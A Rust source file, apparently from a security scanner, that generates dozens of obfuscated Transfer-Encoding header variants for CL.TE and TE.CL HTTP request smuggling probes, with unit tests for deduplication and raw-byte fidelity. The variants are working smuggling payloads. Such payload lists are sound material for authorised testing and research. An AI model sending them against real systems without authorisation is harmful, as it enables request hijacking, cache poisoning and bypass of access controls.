/// Generate Transfer-Encoding header variations for CL.TE and TE.CL attacks
/// Based on PortSwigger's http-request-smuggler patterns.
///
/// Each variation is returned as raw bytes (`Vec<u8>`) rather than a `String`.
/// This matters for the extended-ASCII obfuscations (NEL `0x85`, NBSP `0xA0`,
/// soft-hyphen `0xAD`, …): those bytes are not valid standalone UTF-8, so a
/// `String` cannot carry them — building one via `String::from_utf8_lossy`
/// silently replaces each with U+FFFD (`EF BF BD`) and the intended byte never
/// reaches the wire. Returning bytes lets the exact obfuscation byte be sent.
pub fn get_te_header_variations() -> Vec<Vec<u8>> {
    // The bulk of the variations are pure ASCII (including control bytes such as
    // `\x00`, `\r`, `\n`, `\t`, `\x0B`, `\x0C`, `\x7F`, all of which round-trip
    // through a UTF-8 string). Keep them as readable string literals and convert
    // to bytes below.
    let ascii_variations: &[&str] = &[
        // === Basic vanilla variation ===
        "Transfer-Encoding: chunked",
        // === Whitespace variations ===
        " Transfer-Encoding: chunked", // Space prefix (nameprefix with space)
        "\tTransfer-Encoding: chunked", // Tab prefix
        "Transfer-Encoding : chunked", // Space before colon (space1)
        "Transfer-Encoding  : chunked", // Double space before colon
        "Transfer-Encoding\t: chunked", // Tab before colon
        "Transfer-Encoding:\tchunked", // Tab after colon
        "Transfer-Encoding\t:\tchunked", // Tab around colon
        "Transfer-Encoding:  chunked", // Double space after colon
        "Transfer-Encoding:chunked",   // No space after colon (nospace1)
        "Transfer-Encoding: chunked ", // Trailing space
        "Transfer-Encoding: chunked\t", // Trailing tab (tabsuffix)
        "Transfer-Encoding: chunked\r", // CR suffix (0dsuffix)
        // === Line wrapping/folding variations (HTTP/1.1 obs-fold) ===
        "Transfer-Encoding:\n chunked", // Newline + space (linewrapped1)
        "Transfer-Encoding:\r\n chunked", // CRLF + space (line folding)
        "Transfer-Encoding:\r\n\tchunked", // CRLF + tab (tabwrap)
        "Transfer-Encoding\r\n : chunked", // CRLF before colon
        "Transfer-Encoding:\r\n \r\n chunked", // Double wrapped (doublewrapped)
        "Foo: bar\r\n Transfer-Encoding: chunked", // Line-folded after another header (nameprefix1)
        "Foo: bar\r\n\tTransfer-Encoding: chunked", // Tab-prefixed after header (nameprefix2)
        // === Control character variations ===
        "Transfer-Encoding:\x0Bchunked",  // Vertical tab after colon
        "Transfer-Encoding: \x0Bchunked", // Vertical tab in value (vertwrap)
        "Transfer-Encoding:\x0Cchunked",  // Form feed after colon
        "Transfer-Encoding: chunked\n\x0B", // Vertical tab wrap after value
        // === Special prefix/suffix bytes ===
        "\x00Transfer-Encoding: chunked", // Null byte prefix
        "Transfer-Encoding\x00: chunked", // Null in header name
        "Transfer-Encoding: chunked\x00", // Null suffix
        "\x7FTransfer-Encoding: chunked", // DEL char prefix
        "Transfer-Encoding\x7F: chunked", // DEL in header name
        // === Quote variations ===
        "Transfer-Encoding: \"chunked\"", // Double quoted (quoted)
        "Transfer-Encoding: 'chunked'",   // Single quoted (aposed)
        // === Multiple encoding values ===
        "Transfer-Encoding: chunked, identity", // Comma-separated (commaCow)
        "Transfer-Encoding: identity, chunked", // Reversed order (cowComma)
        "Transfer-Encoding: chunked,identity",  // No space after comma
        "Transfer-Encoding: identity,chunked",  // No space, reversed
        "Transfer-Encoding: chunked , identity", // Spaces around comma
        "Transfer-Encoding: identity, chunked, identity", // Nested encoding
        // === Header name variations ===
        "Transfer_Encoding: chunked", // Underscore instead of hyphen (underjoin1)
        "Transfer Encoding: chunked", // Space instead of hyphen (spacejoin1)
        "Transfer\\Encoding: chunked", // Backslash instead of hyphen
        "Transfer\x00Encoding: chunked", // Null in hyphen position
        // === Case variations ===
        "transfer-encoding: chunked", // Lowercase
        "TRANSFER-ENCODING: chunked", // Uppercase
        "TRANSFER-ENCODING: CHUNKED", // All uppercase
        "tRaNsFeR-eNcOdInG: cHuNkEd", // Mixed case (multiCase)
        "Transfer-encoding: chunked", // First letter caps only
        // === Value variations ===
        "Transfer-Encoding: chunk",    // Truncated value (lazygrep)
        "Transfer-Encoding: CHUNKED",  // Uppercase value
        "Transfer-Encoding:  Chunked", // Mixed case with extra space
        // === Bad line ending variations ===
        "Foo: bar\rTransfer-Encoding: chunked", // CR only before TE (badsetupCR)
        "Foo: bar\nTransfer-Encoding: chunked", // LF only before TE (badsetupLF)
        "Foo: bar\r\n\rTransfer-Encoding: chunked", // Extra CR (0dwrap)
        // === CR injection variations ===
        "Tra\rnsfer-Encoding: chunked", // CR in header name (0dspam)
        "Transfer-\rEncoding: chunked", // CR after hyphen
        "Transfer-Encoding:\r chunked", // CR + space after colon
        // === Junk/garbage variations ===
        "Transfer-Encoding x: chunked", // Junk before colon (spjunk)
        "Transfer-Encoding: x chunked", // Junk in value
        "X: y\r\nTransfer-Encoding: chunked", // Preceded by junk header
        // === URL-encoded variations ===
        "Transfer-%45ncoding: chunked", // URL-encoded E (encode)
        "Transfer-Encoding: %63hunked", // URL-encoded c in value
        // === MIME encoding variations ===
        "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=", // Base64 MIME (qencode)
        "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=",      // UTF-8 Base64 MIME (qencodeutf)
        // === HTTP/1.0 style ===
        "Transfer-Encoding: chunked", // Standard for HTTP/1.0 test
    ];

    let mut te_headers: Vec<Vec<u8>> = ascii_variations
        .iter()
        .map(|s| s.as_bytes().to_vec())
        .collect();

    // Extended-ASCII variations (bytes > 0x7F). These are the whole reason this
    // function is byte-oriented: the raw obfuscation byte is spliced directly
    // into the header, so a parser that treats e.g. NEL/NBSP as whitespace (or
    // strips a soft-hyphen) can be probed. `byte_header` builds `prefix || raw ||
    // suffix` from ASCII fragments plus the exact byte. Inspired by PortSwigger's
    // nel/nbsp/shy/spaceFF/accentTE/accentCH cases.
    let byte_header = |prefix: &str, raw: u8, suffix: &str| -> Vec<u8> {
        let mut v = Vec::with_capacity(prefix.len() + 1 + suffix.len());
        v.extend_from_slice(prefix.as_bytes());
        v.push(raw);
        v.extend_from_slice(suffix.as_bytes());
        v
    };
    te_headers.extend([
        // NEL (0x85) in the header name
        byte_header("Transfer-Encoding", 0x85, ": chunked"),
        // NBSP (0xA0) in the header name
        byte_header("Transfer-Encoding", 0xA0, ": chunked"),
        // Soft hyphen (0xAD) replacing the hyphen
        byte_header("Transfer", 0xAD, "Encoding: chunked"),
        // NBSP (0xA0) after the colon
        byte_header("Transfer-Encoding:", 0xA0, "chunked"),
        // High byte (0xFF) in the value
        byte_header("Transfer-Encoding: ", 0xFF, "chunked"),
        // Accented byte (0x82) in the header name
        byte_header("Transf", 0x82, "r-Encoding: chunked"),
        // Accented byte (0x96) in the value
        byte_header("Transfer-Encoding: ch", 0x96, "nked"),
    ]);

    // Control character constants for header manipulation patterns.
    // These are common control characters used in HTTP request smuggling attacks.
    const NUL: u8 = 0x00; // Null byte - can cause early string termination in some parsers
    const TAB: u8 = 0x09; // Horizontal tab - valid HTTP whitespace
    const LF: u8 = 0x0A; // Line feed - HTTP line separator
    const VT: u8 = 0x0B; // Vertical tab - not valid HTTP whitespace, but sometimes accepted
    const FF: u8 = 0x0C; // Form feed - not valid HTTP whitespace, but sometimes accepted
    const CR: u8 = 0x0D; // Carriage return - HTTP line separator
    const SP: u8 = 0x20; // Space - valid HTTP whitespace
    const DEL: u8 = 0x7F; // Delete character - can cause parsing issues

    // Add whitespace prefix variations with common control characters.
    // These test how parsers handle control characters before header names.
    for ch in [NUL, TAB, LF, VT, FF, CR, SP, DEL] {
        if ch != TAB && ch != SP {
            // Skip tab and space as they're already covered in basic variations.
            te_headers.push(byte_header("", ch, "Transfer-Encoding: chunked"));
        }
    }

    // Add suffix variations with control characters after the value.
    // These test how parsers handle trailing control characters.
    for ch in [NUL, TAB, VT, FF, DEL] {
        te_headers.push(byte_header("Transfer-Encoding: chunked", ch, ""));
    }

    // Add header name suffix variations (control character before colon).
    // These test how parsers handle control characters in header names.
    for ch in [NUL, TAB, VT, FF, DEL] {
        te_headers.push(byte_header("Transfer-Encoding", ch, ": chunked"));
    }

    // Drop byte-identical duplicates while preserving order. Several explicit
    // entries above are re-emitted by the control-character loops (e.g. the null
    // suffix, tab suffix, and single-byte prefixes/suffixes), so without this
    // each duplicated variation would be sent twice per CL.TE / TE.CL check —
    // wasted, identical requests that add nothing.
    let mut seen = std::collections::HashSet::with_capacity(te_headers.len());
    te_headers.retain(|h| seen.insert(h.clone()));

    te_headers
}

#[cfg(test)]
mod tests {
    use super::get_te_header_variations;
    use std::collections::HashSet;

    #[test]
    fn variations_have_no_byte_identical_duplicates() {
        // The control-character loops used to re-emit several explicit entries
        // (e.g. `Transfer-Encoding: chunked\0`), so each was smuggled twice per
        // check. After dedup, every variation must be unique.
        let vars = get_te_header_variations();
        let unique: HashSet<&Vec<u8>> = vars.iter().collect();
        assert_eq!(
            vars.len(),
            unique.len(),
            "get_te_header_variations must not contain byte-identical duplicates"
        );
        // The plain vanilla header must still be present exactly once.
        assert_eq!(
            vars.iter()
                .filter(|h| h.as_slice() == b"Transfer-Encoding: chunked")
                .count(),
            1
        );
    }

    #[test]
    fn extended_ascii_variations_carry_raw_bytes_not_replacement_chars() {
        // The core regression: the NEL/NBSP/soft-hyphen/… variants must place the
        // exact byte on the wire, never the U+FFFD replacement (`EF BF BD`) that
        // `String::from_utf8_lossy` produced. Assert each raw byte is present and
        // that no variation contains the replacement sequence.
        let vars = get_te_header_variations();
        let replacement: &[u8] = &[0xEF, 0xBF, 0xBD];
        assert!(
            vars.iter().all(|v| !v.windows(3).any(|w| w == replacement)),
            "no variation may contain the U+FFFD replacement bytes"
        );
        for raw in [0x85u8, 0xA0, 0xAD, 0xFF, 0x82, 0x96] {
            assert!(
                vars.iter().any(|v| v.contains(&raw)),
                "extended-ASCII byte {raw:#04x} must appear verbatim in some variation"
            );
        }
        // And the distinct NEL vs NBSP name variants must NOT collapse together
        // (they used to, both becoming U+FFFD).
        let nel = vars.iter().any(|v| {
            v.starts_with(b"Transfer-Encoding") && v.contains(&0x85) && v.ends_with(b": chunked")
        });
        let nbsp = vars.iter().any(|v| {
            v.starts_with(b"Transfer-Encoding") && v.contains(&0xA0) && v.ends_with(b": chunked")
        });
        assert!(nel && nbsp, "NEL and NBSP name variants must both survive");
    }
}
